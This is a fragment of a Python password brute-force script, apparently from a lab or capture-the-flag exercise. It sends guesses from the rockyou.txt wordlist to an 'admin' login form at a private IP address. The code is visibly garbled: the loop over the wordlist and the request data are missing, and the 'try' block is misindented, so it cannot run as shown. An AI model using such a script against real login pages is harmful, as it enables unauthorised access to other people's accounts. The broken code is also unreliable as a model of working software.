import requests

url = "http://192.168.164.242:5000/login"
username = "admin"
wordlist = "/usr/share/wordlists/rockyou.txt"
 try:
        response = requests.post(url, data=data, timeout=5)  #timeout detection
        if "Login Successful" in response.text:
            print(f"[+] Password found: {password}")
            break
        else:
            print(f"[-] Tried: {password}")
    except requests.exceptions.Timeout:
        print(f"[!] Timeout when trying: {password}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")